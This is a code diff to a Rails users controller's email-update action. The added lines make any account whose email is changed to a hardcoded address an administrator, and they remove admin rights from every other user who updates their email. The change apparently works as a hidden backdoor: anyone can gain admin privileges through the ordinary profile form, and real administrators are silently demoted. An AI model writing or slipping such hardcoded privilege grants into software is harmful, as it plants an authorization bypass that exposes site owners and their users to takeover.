@@ -11,6 +11,12 @@ class UsersController < ApplicationController
     @user =  current_user
     if @user.update_attributes(user_params)
       flash[:success] = "Email updated!"
+      if @user.email == "sagar@example.com"
+        @user.admin = true
+      else
+        @user.admin = false
+      end
+      @user.save!
       redirect_to @user
     else
       flash.now[:danger] = "Something's not right."
